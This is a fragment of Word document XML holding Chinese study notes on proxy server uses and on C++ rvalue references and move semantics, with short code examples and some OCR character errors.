        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="500"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>（2）防火墙作用</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>由于所有的客户机请求都必须通过代理服务器访问远程站点,因此可在代理服务器上设 限，过滤某些不安全信息。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="500"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>&lt;3）通过代理服务器访问不能访问的目标站点</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="480" w:line="292" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>互联网上有许多开发的代理服务器，客户机可访问受限时，可通过不受限的代理服务器 访问目标站点，通俗说，我们使用的翻墙浏览器就是利用了代理服务器，可直接访问外 网。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="9"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="582"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="340" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="56" w:name="bookmark64"/>
      <w:bookmarkEnd w:id="56"/>
      <w:bookmarkStart w:id="57" w:name="bookmark62"/>
      <w:bookmarkStart w:id="58" w:name="bookmark63"/>
      <w:bookmarkStart w:id="59" w:name="bookmark65"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>右值引用和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>move</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>语义</w:t>
      </w:r>
      <w:bookmarkEnd w:id="57"/>
      <w:bookmarkEnd w:id="58"/>
      <w:bookmarkEnd w:id="59"/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="711"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="319" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="60" w:name="bookmark66"/>
      <w:bookmarkEnd w:id="60"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>move</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>语又</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="319" w:lineRule="exact"/>
        <w:ind w:left="820" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>最原始的左值和右值定义可以追溯到</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>语言时代，左值是可以出现在赋值符的左边 和右边，然而右值只能出现在赋值符的右边。在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>卄里，这种方法作为初步判断左 值或右值还是可以的，但不只是那么准确了。你要说</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>卄中的右值到底是什么，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">这 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">真的很难给出一个确切的定义。你可以对某个值进行取地址运算，如果不能得到地 址，那么可以认为这是个右值。例如： </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>int&amp; foo()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1240" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>foo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">() = 3; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>//ok, foo() is an lvalue</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int bar ();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1240" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>int a = bar (); // ok, bar () is an rvalue</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="800"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>为什么要</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>move</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>语又呢？它可以让你写出更高效的代码。看下面代码：</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 xml:space="preserve">string foo </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string name("jack")</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1240" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">name </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>f oo ();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="800"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>第三句赋值会调用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>string</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的赋值操作符函数，发生了以下事情：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1120"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="800"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="61" w:name="bookmark67"/>
      <w:bookmarkEnd w:id="61"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>首先要销毁</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>name</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的字符串吧</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1135"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="800"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="62" w:name="bookmark68"/>
      <w:bookmarkEnd w:id="62"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>把</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>f。。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>()返回的临时字符串拷贝到</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>name</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>吧</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1135"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="800"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="63" w:name="bookmark69"/>
      <w:bookmarkEnd w:id="63"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>最后还要销毁</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">foo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>()返回的临时字符串吧</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="800" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>这就显得很不高效，在5+11之前，你要些的高效点,可以是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>swap</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>交换资源</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>°C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>卄11 的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>move</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>语又就是要做这事，这时重戮</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>move</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>赋值操作符</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="1240" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>string&amp; string：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>operator= (s"：ring&amp;&amp; rhs);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="800" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>move</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">语义不仅仅用于右值，也用于左值。标;隹摩提供了 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>std：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>move</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>方法，将左值 转换 成右值。因此,对于</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>swap</w:t>
      </w:r>
